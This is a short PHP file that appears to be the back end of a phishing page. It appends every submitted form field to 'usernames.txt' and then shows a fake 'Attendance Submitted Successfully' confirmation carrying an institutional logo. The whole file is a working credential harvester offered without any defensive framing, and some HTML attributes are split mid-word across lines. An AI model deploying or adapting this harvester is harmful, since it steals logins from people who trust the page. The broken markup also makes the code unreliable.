<?php  
$handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) { 
fwrite($handle, $variable); fwrite($handle, " = "); 
fwrite($handle, $value); fwrite($handle, "\r\n");
} ?>
<html>                                              <head>                                      <title>Success</title>
        <link rel="icon" type="image/png" hr
ef="./mtulogo.png"/>                                </head>                                     <body>
                <h1 style="color: green" ali
gn="center" > Attendance Submitted Successfully !</h1>
        </body>
</html>
<?php
fwrite($handle, "\r\n"); fclose($handle); exit; ?>
